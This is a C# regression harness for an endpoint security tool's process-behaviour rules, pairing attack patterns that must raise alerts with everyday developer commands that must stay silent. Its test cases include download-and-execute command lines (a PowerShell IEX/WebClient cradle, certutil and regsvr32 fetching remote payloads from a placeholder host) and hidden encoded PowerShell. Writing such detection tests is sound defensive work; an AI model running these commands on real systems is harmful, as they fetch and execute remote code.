using Sentinel.Core.Detect;
using Sentinel.Core.Processes;

namespace Sentinel.Cli;

/// <summary>
/// A regression harness for the behaviour rules.
///
/// Detection code is the one part of this project that cannot be validated by running it —
/// you would have to detonate real malware to see it work. So it is validated against a
/// table instead: known attack shapes that must fire, and everyday developer noise that must
/// stay silent. The second half matters more. A rule that flags every build script gets the
/// whole product muted, which is a worse failure than missing a sample.
///
/// Run with: <c>sentinel --rule-test</c>
/// </summary>
internal static class RuleTest
{
    /// <summary>What the rules are allowed to do with a case.</summary>
    private enum Expect
    {
        /// <summary>Nothing at all. Ordinary work must not produce a single finding.</summary>
        Silent,
        /// <summary>May be written to the log, but must stay below the alert floor.</summary>
        Quiet,
        /// <summary>Must reach High or above — this is what the product exists for.</summary>
        Alert,
    }

    private sealed record Case(string What, ProcessContext Ctx, Expect Expect, string? ExpectRule = null);

    private const string Sys = @"C:\Windows\System32\";
    private const string Temp = @"C:\Users\dev\AppData\Local\Temp\";

    private static ProcessContext P(
        string name, string? parent = null, string? path = null, string? cmd = null,
        SignatureState sig = SignatureState.SignedValid, bool hidden = false,
        bool implanted = false, int remote = 0) =>
        new(1234, name, 900, parent, path ?? Sys + name, cmd, sig, hidden, implanted, remote, 1);

    private static readonly Case[] Cases =
    {
        // ---------- must raise an alert ----------
        new("Word spawning PowerShell (macro)",
            P("powershell.exe", "winword.exe", cmd: Sys + "powershell.exe -w hidden"),
            Expect.Alert, "lolbin.office-parent"),

        new("Encoded PowerShell command",
            P("powershell.exe", "explorer.exe",
              cmd: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="),
            Expect.Alert, "lolbin.command-line"),

        new("Encoded via a -e prefix",
            P("powershell.exe", "explorer.exe",
              cmd: "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="),
            Expect.Alert, "lolbin.command-line"),

        new("Download cradle (IEX + WebClient)",
            P("powershell.exe", "explorer.exe",
              cmd: "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.io/a.ps1')\""),
            Expect.Alert, "lolbin.command-line"),

        new("certutil as a downloader",
            P("certutil.exe", "cmd.exe", cmd: "certutil -urlcache -split -f http://x.io/a.exe a.exe"),
            Expect.Alert, "lolbin.command-line"),

        new("squiblydoo (regsvr32 remote scriptlet)",
            P("regsvr32.exe", "cmd.exe", cmd: "regsvr32 /s /u /i:http://x.io/a.sct scrobj.dll"),
            Expect.Alert, "lolbin.command-line"),

        new("svchost.exe from a temp folder",
            P("svchost.exe", "explorer.exe", path: Temp + "svchost.exe", sig: SignatureState.Unsigned),
            Expect.Alert, "masquerade.system-name"),

        new("Double extension lure",
            P("invoice.pdf.exe", "explorer.exe", path: Temp + "invoice.pdf.exe",
              sig: SignatureState.Unsigned),
            Expect.Alert, "masquerade.double-extension"),

        new("rundll32 with no arguments",
            P("rundll32.exe", "explorer.exe", cmd: Sys + "rundll32.exe"),
            Expect.Alert, "lolbin.bare-rundll32"),

        new("Hidden from one enumeration source",
            P("anything.exe", "explorer.exe", hidden: true),
            Expect.Alert, "stealth.hidden"),

        new("Injected PE in memory",
            P("notepad.exe", "explorer.exe", implanted: true),
            Expect.Alert, "memory.implanted-pe"),

        new("Broken signature",
            P("updater.exe", "explorer.exe", path: @"C:\Tools\updater.exe",
              sig: SignatureState.SignedInvalid),
            Expect.Alert, "sign.invalid"),

        new("Unsigned binary in temp calling out",
            P("x.exe", "explorer.exe", path: Temp + "x.exe", sig: SignatureState.Unsigned, remote: 3),
            Expect.Alert, "network.unsigned-remote"),

        new("wscript running from temp",
            P("wscript.exe", "explorer.exe", path: Temp + "wscript.exe", sig: SignatureState.Unsigned),
            Expect.Alert, "script.user-path"),

        // ---------- worth logging, never worth a pop-up ----------
        new("Invoke-WebRequest downloading an installer to disk",
            P("powershell.exe", "explorer.exe",
              cmd: "powershell -Command \"Invoke-WebRequest -Uri https://x.io/setup.msi -OutFile setup.msi\""),
            Expect.Quiet, "lolbin.command-line"),

        // ---------- must stay completely silent (everyday developer noise) ----------
        new("A build script's PowerShell",
            P("powershell.exe", "cmd.exe",
              cmd: "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"& ./build.ps1\""),
            Expect.Silent),

        new("An agent shell wrapper using Invoke-Expression locally",
            P("powershell.exe", "cmd.exe",
              cmd: "powershell.exe -NoProfile -Command \"$s = $env:SCRIPT; Invoke-Expression -Command $s\""),
            Expect.Silent),

        new("curl fetching an API in a terminal",
            P("curl.exe", "cmd.exe", cmd: "curl -s https://api.github.com/repos/x/y"),
            Expect.Silent),

        new("git.exe from Program Files",
            P("git.exe", "cmd.exe", path: @"C:\Program Files\Git\bin\git.exe"),
            Expect.Silent),

        new("Ordinary svchost",
            P("svchost.exe", "services.exe", cmd: Sys + "svchost.exe -k netsvcs -p"),
            Expect.Silent),

        new("node running an inline script",
            P("node.exe", "cmd.exe", path: @"C:\Program Files\nodejs\node.exe",
              cmd: "node -e \"console.log(1)\""),
            Expect.Silent),

        new("Explorer itself",
            P("explorer.exe", "userinit.exe", path: @"C:\Windows\explorer.exe"),
            Expect.Silent),

        new("An unsigned tool the user built, in their own projects folder",
            P("mytool.exe", "cmd.exe", path: @"D:\src\mytool\bin\mytool.exe",
              sig: SignatureState.Unsigned),
            Expect.Silent),

        new("msiexec installing a normal package",
            P("msiexec.exe", "explorer.exe", cmd: "msiexec /i setup.msi /qn"),
            Expect.Silent),
    };

    public static bool Run()
    {
        int pass = 0, fail = 0;
        Console.WriteLine($"Behaviour rules — {Cases.Length} cases\n" + new string('-', 78));

        foreach (var c in Cases)
        {
            var result = BehaviorEngine.Evaluate(c.Ctx);

            bool ok = c.Expect switch
            {
                Expect.Silent => result.IsEmpty,
                Expect.Quiet => !result.IsEmpty && result.Severity < Severity.High,
                Expect.Alert => result.Severity >= Severity.High,
                _ => false,
            };
            if (ok && c.ExpectRule is not null)
                ok = result.Detections.Any(d => d.Rule == c.ExpectRule);

            if (ok) pass++; else fail++;

            string rules = result.IsEmpty
                ? "(silent)"
                : string.Join(", ", result.Detections.Select(d => d.Rule));
            Console.WriteLine($"  {(ok ? "PASS" : "FAIL")}  {c.What,-52} {c.Expect,-6} " +
                              $"score {result.Score,3}  {rules}");
            if (!ok && c.ExpectRule is not null)
                Console.WriteLine($"        expected rule: {c.ExpectRule}");
        }

        Console.WriteLine(new string('-', 78));
        Console.WriteLine($"  {pass} passed, {fail} failed");
        return fail == 0;
    }
}
